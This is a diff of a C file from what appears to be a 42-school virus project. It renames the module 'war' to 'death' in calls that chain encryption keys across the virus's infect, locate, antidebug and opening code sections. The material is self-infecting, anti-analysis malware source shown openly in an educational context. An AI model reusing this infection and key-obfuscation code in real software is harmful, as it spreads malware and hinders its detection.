@@ -6,11 +6,11 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/17 11:03:03 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/22 21:01:35 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "war.h"
+#include "death.h"
 
 /*
    main() transform our main host (number 0 infection) into an *almost* infected binary
@@ -79,16 +79,16 @@ int		main(void)
 	revert_one(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
 
 	// locate
-	update_two(&data.key, (char*)war, (size_t)locate - (size_t)war);
+	update_two(&data.key, (char*)death, (size_t)locate - (size_t)death);
 	revert_two(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
 
-	// war
-	update_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);
-	revert_one(&data.key, (char*)war, (size_t)locate - (size_t)war);
+	// death
+	update_one(&data.key, (char*)opening, (size_t)death - (size_t)opening);
+	revert_one(&data.key, (char*)death, (size_t)locate - (size_t)death);
 
 	// opening
 	update_two(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug);
-	revert_two(&data.key, (char*)opening, (size_t)war - (size_t)opening);
+	revert_two(&data.key, (char*)opening, (size_t)death - (size_t)opening);
 
 	// antidebug
 	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start);
